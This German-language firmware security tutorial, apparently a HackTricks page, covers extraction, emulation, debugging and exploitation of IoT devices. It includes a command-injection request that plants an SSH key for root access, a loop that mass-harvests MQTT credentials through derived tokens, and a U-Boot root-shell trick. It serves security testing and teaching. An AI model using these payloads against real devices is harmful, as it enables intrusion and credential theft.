# Firmware-Analyse

{{#include ../../banners/hacktricks-training.md}}

## **Einführung**

### Verwandte Ressourcen


{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

Firmware ist essentielle Software, die Geräte in die Lage versetzt, korrekt zu funktionieren, indem sie die Kommunikation zwischen Hardwarekomponenten und der Software, mit der Benutzer interagieren, verwaltet und ermöglicht. Sie wird in permanentem Speicher abgelegt, sodass das Gerät von dem Moment an, in dem es eingeschaltet wird, auf wichtige Anweisungen zugreifen kann, was zum Start des Betriebssystems führt. Das Untersuchen und gegebenenfalls Modifizieren von Firmware ist ein entscheidender Schritt, um Sicherheitslücken zu identifizieren.

## **Informationsbeschaffung**

**Informationsbeschaffung** ist ein kritischer erster Schritt, um den Aufbau eines Geräts und die verwendeten Technologien zu verstehen. Dieser Prozess beinhaltet das Sammeln von Daten zu:

- CPU-Architektur und dem darauf laufenden Betriebssystem
- Bootloader-Details
- Hardware-Layout und Datasheets
- Metriken der Codebasis und Quellorte
- Externe Bibliotheken und Lizenztypen
- Update-Historien und regulatorische Zertifizierungen
- Architektur- und Ablaufdiagramme
- Sicherheitsbewertungen und identifizierte Schwachstellen

Für diesen Zweck sind open-source intelligence (OSINT)-Tools sehr wertvoll, ebenso wie die Analyse verfügbarer Open-Source-Softwarekomponenten durch manuelle und automatisierte Prüfprozesse. Tools wie [Coverity Scan](https://scan.coverity.com) und [Semmle’s LGTM](https://lgtm.com/#explore) bieten kostenlose statische Analysen, die genutzt werden können, um potenzielle Probleme zu finden.

## **Beschaffung der Firmware**

Das Erlangen von Firmware kann auf verschiedene Weisen erfolgen, jede mit unterschiedlichem Komplexitätsgrad:

- **Direkt** von der Quelle (Entwickler, Hersteller)
- **Erstellen** anhand bereitgestellter Anweisungen
- **Herunterladen** von offiziellen Support-Seiten
- Einsatz von **Google dork**-Abfragen, um gehostete Firmware-Dateien zu finden
- Zugriff direkt auf Cloud-Speicher, mit Tools wie [S3Scanner](https://github.com/sa7mon/S3Scanner)
- Abfangen von **updates** mittels man-in-the-middle-Techniken
- **Extrahieren** vom Gerät über Schnittstellen wie **UART**, **JTAG** oder **PICit**
- **Sniffing** nach Update-Anfragen in der Gerätekommunikation
- Identifizieren und Verwenden von **hardcoded update endpoints**
- **Dumping** aus dem Bootloader oder Netzwerk
- **Entfernen und Auslesen** des Speicherchips, wenn alles andere fehlschlägt, mit geeigneten Hardware-Tools

### UART-only logs: force a root shell via U-Boot env in flash

Wenn UART RX ignoriert wird (nur Logs), kannst du trotzdem eine init-Shell erzwingen, indem du den U-Boot environment blob offline bearbeitest:

1. Dump SPI flash with a SOIC-8 clip + programmer (3.3V):
```bash
flashrom -p ch341a_spi -r flash.bin
```
2. Locate the U-Boot env partition, edit `bootargs` to include `init=/bin/sh`, and **recompute the U-Boot env CRC32** for the blob.
3. Reflash only the env partition and reboot; a shell should appear on UART.

Das ist nützlich bei Embedded-Geräten, bei denen die Bootloader-Shell deaktiviert ist, aber die env-Partition über externen Flash-Zugriff beschreibbar ist.

## Firmware analysieren

Jetzt, wo du die Firmware hast, musst du Informationen daraus extrahieren, um zu wissen, wie du weiter vorgehst. Verschiedene Tools, die du dafür verwenden kannst:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```
Wenn du mit diesen Tools nicht viel findest, prüfe die **entropy** des Images mit `binwalk -E <bin>`: bei niedriger entropy ist es unwahrscheinlich, dass es verschlüsselt ist. Bei hoher entropy ist es wahrscheinlich verschlüsselt (oder auf irgendeine Weise komprimiert).

Außerdem kannst du diese Tools verwenden, um **in der Firmware eingebettete Dateien** zu extrahieren:


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

Oder [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)), um die Datei zu inspizieren.

### Dateisystem extrahieren

Mit den zuvor genannten Tools wie `binwalk -ev <bin>` solltest du in der Lage gewesen sein, das **Dateisystem zu extrahieren**.\
Binwalk extrahiert es normalerweise in einen **Ordner, der nach dem Dateisystemtyp benannt ist**, der üblicherweise einer der folgenden ist: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Manuelle Dateisystem-Extraktion

Manchmal hat binwalk **nicht das magic byte des Dateisystems in seinen Signaturen**. In diesen Fällen benutze binwalk, um **den offset des Dateisystems zu finden und das komprimierte Dateisystem zu carve** aus der Binärdatei und das Dateisystem anschließend entsprechend seinem Typ **manuell zu extrahieren**, indem du die untenstehenden Schritte befolgst.
```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```
Führe den folgenden **dd command** aus, um das Squashfs-Dateisystem zu extrahieren.
```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```
Alternativ kann auch folgender Befehl ausgeführt werden.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- Für squashfs (im obigen Beispiel verwendet)

`$ unsquashfs dir.squashfs`

Die Dateien befinden sich anschließend im Verzeichnis "`squashfs-root`".

- CPIO-Archivdateien

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- Für jffs2-Dateisysteme

`$ jefferson rootfsfile.jffs2`

- Für ubifs-Dateisysteme mit NAND-Flash

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

## Firmware analysieren

Sobald die Firmware vorliegt, ist es wichtig, sie zu zerlegen, um ihre Struktur und mögliche Schwachstellen zu verstehen. Dabei werden verschiedene Tools verwendet, um Daten aus dem Firmware-Image zu analysieren und zu extrahieren.

### Erste Analyse-Tools

Eine Reihe von Befehlen wird für die Erstprüfung der Binärdatei (im Folgenden `<bin>`) bereitgestellt. Diese Befehle helfen dabei, Dateitypen zu identifizieren, Strings zu extrahieren, Binärdaten zu analysieren und Partitionen sowie Dateisystemdetails zu verstehen:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```
Um den Verschlüsselungsstatus des Images zu beurteilen, wird die **Entropie** mit `binwalk -E <bin>` überprüft. Niedrige Entropie deutet auf fehlende Verschlüsselung hin, hohe Entropie auf mögliche Verschlüsselung oder Kompression.

Zum Extrahieren **eingebetteter Dateien** werden Tools und Ressourcen wie die Dokumentation **file-data-carving-recovery-tools** und **binvis.io** zur Dateiansicht empfohlen.

### Extrahieren des Dateisystems

Mit `binwalk -ev <bin>` kann man normalerweise das Dateisystem extrahieren, oft in ein Verzeichnis benannt nach dem Dateisystemtyp (z.B. squashfs, ubifs). Wenn jedoch **binwalk** aufgrund fehlender Magic-Bytes den Dateisystemtyp nicht erkennt, ist eine manuelle Extraktion nötig. Dabei verwendet man `binwalk`, um den Offset des Dateisystems zu finden, gefolgt vom `dd`-Befehl, um das Dateisystem auszuschneiden:
```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```
Anschließend werden je nach Dateisystemtyp (z. B. squashfs, cpio, jffs2, ubifs) unterschiedliche Befehle verwendet, um die Inhalte manuell zu extrahieren.

### Dateisystem-Analyse

Sobald das Dateisystem extrahiert ist, beginnt die Suche nach Sicherheitslücken. Dabei wird auf unsichere Netzwerkdaemons, hardcodierte Anmeldeinformationen, API-Endpunkte, Update-Server-Funktionen, nicht kompilierte Codebestandteile, Startskripte und kompilierte Binaries zur Offline-Analyse geachtet.

**Wichtige Orte** und **Elemente** zur Untersuchung sind:

- **etc/shadow** und **etc/passwd** für Benutzeranmeldeinformationen
- SSL-Zertifikate und Keys in **etc/ssl**
- Konfigurations- und Skriptdateien auf potenzielle Schwachstellen
- Eingebettete Binaries zur weiteren Analyse
- Häufige Webserver und Binaries von IoT-Geräten

Mehrere Tools helfen dabei, sensitive Informationen und Schwachstellen im Dateisystem aufzudecken:

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) und [**Firmwalker**](https://github.com/craigz28/firmwalker) für die Suche nach sensitiven Informationen
- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) für umfassende Firmware-Analyse
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go), und [**EMBA**](https://github.com/e-m-b-a/emba) für statische und dynamische Analyse

### Sicherheitsprüfungen an kompilierten Binaries

Sowohl Quellcode als auch gefundene, kompilierte Binaries im Dateisystem müssen auf Schwachstellen geprüft werden. Tools wie **checksec.sh** für Unix-Binaries und **PESecurity** für Windows-Binaries helfen dabei, ungeschützte Binaries zu identifizieren, die ausgenutzt werden könnten.

## Sammeln von Cloud-Konfiguration und MQTT-Zugangsdaten über abgeleitete URL-Tokens

Viele IoT-Hubs holen ihre pro-Gerät-Konfiguration von einem Cloud-Endpunkt, der wie folgt aussieht:

- `https://<api-host>/pf/<deviceId>/<token>`

Während der Firmware-Analyse kann man feststellen, dass `<token>` lokal aus der deviceId mithilfe eines hardcodierten Secrets abgeleitet wird, zum Beispiel:

- token = MD5( deviceId || STATIC_KEY ) und als Hex in Großbuchstaben dargestellt

Dieses Design ermöglicht es jedem, der deviceId und STATIC_KEY kennt, die URL zu rekonstruieren und die Cloud-Konfiguration abzurufen, was häufig Klartext-MQTT-Zugangsdaten und Topic-Präfixe offenlegt.

Praktisches Vorgehen:

1) deviceId aus UART-Boot-Logs extrahieren

- Verbinde einen 3.3V UART-Adapter (TX/RX/GND) und erfasse Logs:
```bash
picocom -b 115200 /dev/ttyUSB0
```
- Suche nach Zeilen, die das cloud config URL-Muster und die Broker-Adresse ausgeben, zum Beispiel:
```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```
2) STATIC_KEY und Token-Algorithmus aus der Firmware wiederherstellen

- Lade Binärdateien in Ghidra/radare2 und suche nach dem Konfigurationspfad ("/pf/") oder nach MD5-Verwendung.
- Bestätige den Algorithmus (z. B. MD5(deviceId||STATIC_KEY)).
- Leite das Token in Bash ab und wandle den Digest in Großbuchstaben um:
```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```
3) Cloud-Konfiguration und MQTT-Zugangsdaten erfassen

- Stelle die URL zusammen und rufe JSON mit curl ab; parse es mit jq, um Geheimnisse zu extrahieren:
```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```
4) Missbrauch von unverschlüsseltem MQTT und schwachen topic ACLs (falls vorhanden)

- Verwende wiederhergestellte Anmeldeinformationen, um maintenance topics zu abonnieren und nach sensiblen Ereignissen zu suchen:
```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
-i <client_id> -u <username> -P <password> \
-t "<topic_prefix>/<deviceId>/admin" -v
```
5) Enumerate predictable device IDs (at scale, with authorization)

- Viele Ökosysteme betten Vendor OUI/product/type-Bytes ein, gefolgt von einem sequentiellen Suffix.
- Sie können Kandidaten-IDs durchlaufen, Tokens ableiten und Configs programmgesteuert abrufen:
```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
DEVICE_ID="${PREFIX}${SUF}"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```
Hinweise
- Holen Sie immer eine ausdrückliche Genehmigung ein, bevor Sie mass enumeration versuchen.
- Bevorzugen Sie emulation oder static analysis, um secrets wiederherzustellen, ohne die target hardware zu verändern, wenn möglich.


Der Prozess der Emulation von firmware ermöglicht **dynamic analysis** sowohl der Funktionsweise eines Geräts als auch eines einzelnen Programms. Dieser Ansatz kann auf Probleme durch Hardware- oder Architekturabhängigkeiten stoßen, aber das Übertragen des root filesystem oder bestimmter binaries auf ein Gerät mit passender Architektur und endianness, wie z. B. einem Raspberry Pi, oder auf eine vorkonfigurierte virtual machine, kann weitere Tests erleichtern.

### Emulieren einzelner Binaries

Zur Untersuchung einzelner Programme ist es entscheidend, die endianness und die CPU architecture des Programms zu bestimmen.

#### Beispiel mit MIPS-Architektur

Um ein Binary für die MIPS-Architektur zu emulieren, kann man den folgenden Befehl verwenden:
```bash
file ./squashfs-root/bin/busybox
```
Und um die notwendigen Emulations-Tools zu installieren:
```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```
Für MIPS (big-endian) wird `qemu-mips` verwendet, und für little-endian-Binaries wäre `qemu-mipsel` die Wahl.

#### ARM-Architektur-Emulation

Bei ARM-Binaries ist der Ablauf ähnlich, wobei `qemu-arm` als Emulator verwendet wird.

### Vollständige System-Emulation

Tools like [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit), and others erleichtern die vollständige Firmware-Emulation, automatisieren den Prozess und unterstützen die dynamische Analyse.

## Dynamische Analyse in der Praxis

In diesem Stadium wird entweder eine reale oder eine emulierte Geräteumgebung für die Analyse genutzt. Es ist essenziell, Shell-Zugriff auf das OS und das Dateisystem zu behalten. Emulation bildet Hardware-Interaktionen möglicherweise nicht perfekt ab, sodass gelegentliche Neustarts der Emulation nötig sind. Die Analyse sollte das Dateisystem erneut untersuchen, exponierte Webseiten und Netzwerkdienste ausnutzen und Bootloader-Schwachstellen erforschen. Firmware-Integritätstests sind entscheidend, um mögliche Backdoor-Schwachstellen zu identifizieren.

## Laufzeitanalyse-Techniken

Laufzeitanalyse bedeutet, mit einem Prozess oder Binary in seiner Laufzeitumgebung zu interagieren; dabei werden Tools like gdb-multiarch, Frida, and Ghidra genutzt, um Breakpoints zu setzen und Schwachstellen mittels Fuzzing und anderer Techniken zu identifizieren.

Für Embedded-Ziele ohne vollständigen Debugger: **kopiere einen statisch gelinkten `gdbserver`** auf das Gerät und hänge dich remote an:
```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```
## Binary Exploitation and Proof-of-Concept

Die Entwicklung eines PoC für identifizierte Schwachstellen erfordert ein tiefes Verständnis der Zielarchitektur und der Programmierung in niedrigeren Programmiersprachen. Binary-Runtime-Schutzmechanismen in Embedded-Systemen sind selten, aber wenn vorhanden, können Techniken wie Return Oriented Programming (ROP) notwendig sein.

### uClibc fastbin exploitation notes (embedded Linux)

- **Fastbins + consolidation:** uClibc verwendet fastbins ähnlich wie glibc. Eine spätere große Allocation kann `__malloc_consolidate()` auslösen, daher muss jeder gefälschte Chunk die Prüfungen überstehen (sinnvolle Größe, `fd = 0` und umliegende Chunks als "in use" gesehen).
- **Non-PIE binaries under ASLR:** Wenn ASLR aktiviert ist, das Haupt-Binary jedoch **non-PIE** ist, sind in-binary `.data/.bss`-Adressen stabil. Man kann eine Region anvisieren, die bereits einem gültigen Heap-Chunk-Header ähnelt, um eine fastbin-Allocation auf eine **function pointer table** zu platzieren.
- **Parser-stopping NUL:** Wenn JSON geparst wird, kann ein `\x00` im Payload das Parsen stoppen, während nachfolgende, vom Angreifer kontrollierte Bytes für einen Stack-Pivot/ROP chain erhalten bleiben.
- **Shellcode via `/proc/self/mem`:** Eine ROP chain, die `open("/proc/self/mem")`, `lseek()` und `write()` aufruft, kann ausführbaren Shellcode in einem bekannten Mapping ablegen und dorthin springen.

## Prepared Operating Systems for Firmware Analysis

Betriebssysteme wie [AttifyOS](https://github.com/adi0x90/attifyos) und [EmbedOS](https://github.com/scriptingxss/EmbedOS) bieten vorkonfigurierte Umgebungen für Firmware-Security-Tests und sind mit den notwendigen Tools ausgestattet.

## Prepared OSs to analyze Firmware

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS ist eine Distro, die dich bei Security-Assessments und penetration testing von Internet of Things (IoT)-Geräten unterstützt. Sie spart viel Zeit, indem sie eine vorkonfigurierte Umgebung mit allen notwendigen Tools bereitstellt.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): Embedded security testing operating system basierend auf Ubuntu 18.04, vorinstalliert mit Tools für Firmware-Security-Tests.

## Firmware Downgrade Attacks & Insecure Update Mechanisms

Selbst wenn ein Hersteller kryptografische Signaturprüfungen für Firmware-Images implementiert, wird der Schutz gegen version rollback (downgrade) häufig weggelassen. Wenn der Boot- oder Recovery-Loader nur die Signatur mit einem eingebetteten Public Key prüft, aber nicht die *Version* (oder einen monotonen Zähler) des zu flashenden Images vergleicht, kann ein Angreifer legal eine **ältere, verwundbare Firmware installieren, die weiterhin eine gültige Signatur trägt**, und damit gepatchte Schwachstellen wieder einführen.

Typischer Angriffsablauf:

1. **Obtain an older signed image**
* Lade es vom öffentlichen Download-Portal des Herstellers, CDN oder der Support-Seite herunter.
* Extrahiere es aus begleitenden Mobile-/Desktop-Anwendungen (z. B. innerhalb einer Android-APK unter `assets/firmware/`).
* Beschaffe es aus Drittanbieter-Repositories wie VirusTotal, Internetarchiven, Foren usw.
2. **Upload or serve the image to the device** via any exposed update channel:
* Web UI, mobile-app API, USB, TFTP, MQTT, etc.
* Viele Consumer-IoT-Geräte bieten *unauthenticated* HTTP(S)-Endpoints an, die Base64-kodierte Firmware-Blobs akzeptieren, serverseitig dekodieren und Recovery/Upgrade auslösen.
3. Nach dem Downgrade wird eine Schwachstelle ausgenutzt, die in der neueren Version gepatcht wurde (zum Beispiel ein Command-Injection-Filter, der später hinzugefügt wurde).
4. Optional das neueste Image wieder flashen oder Updates deaktivieren, um eine Entdeckung zu vermeiden, sobald Persistenz erlangt wurde.

### Example: Command Injection After Downgrade
```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```
In der verwundbaren (heruntergestuften) Firmware wird der `md5`-Parameter direkt in einen shell command ohne Sanitisation eingefügt, was die Injektion beliebiger Befehle erlaubt (hier – enabling SSH key-based root access). Spätere Firmware-Versionen führten einen einfachen Zeichenfilter ein, aber das Fehlen eines Downgrade-Schutzes macht die Behebung wirkungslos.

### Extrahieren von Firmware aus Mobile Apps

Viele Hersteller bündeln vollständige Firmware-Images in ihren companion mobile applications, damit die App das Gerät über Bluetooth/Wi-Fi aktualisieren kann. Diese Pakete werden häufig unverschlüsselt in der APK/APEX unter Pfaden wie `assets/fw/` oder `res/raw/` abgelegt. Tools wie `apktool`, `ghidra` oder sogar simples `unzip` erlauben es, signierte Images zu extrahieren, ohne die physische Hardware zu berühren.
```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```
### Checkliste zur Bewertung der Update-Logik

* Ist der Transport/die Authentifizierung des *update endpoint* ausreichend geschützt (TLS + Authentifizierung)?
* Vergleicht das Gerät **Versionsnummern** oder einen **monotonen Anti-Rollback-Zähler**, bevor es flasht?
* Wird das Image innerhalb einer Secure-Boot-Kette verifiziert (z. B. werden Signaturen vom ROM-Code geprüft)?
* Führt der Userland-Code zusätzliche Plausibilitätsprüfungen durch (z. B. erlaubte Partitionstabelle, Modellnummer)?
* Verwenden *partial* oder *backup* Update-Flows die gleiche Validierungslogik?

> 💡  Wenn eines der oben genannten fehlt, ist die Plattform wahrscheinlich anfällig für Rollback-Angriffe.

## Verwundbare Firmware zum Üben

Um das Auffinden von Schwachstellen in Firmware zu üben, verwende die folgenden verwundbaren Firmware-Projekte als Ausgangspunkt.

- OWASP IoTGoat
- [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
- [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
- [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
- [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
- [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
- [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Training und Zertifikate

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

## Referenzen

- [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [Practical IoT Hacking: The Definitive Guide to Attacking the Internet of Things](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [Exploiting zero days in abandoned hardware – Trail of Bits blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [How a $20 Smart Device Gave Me Access to Your Home](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
- [Now You See mi: Now You're Pwned](https://labs.taszk.io/articles/post/nowyouseemi/)

{{#include ../../banners/hacktricks-training.md}}
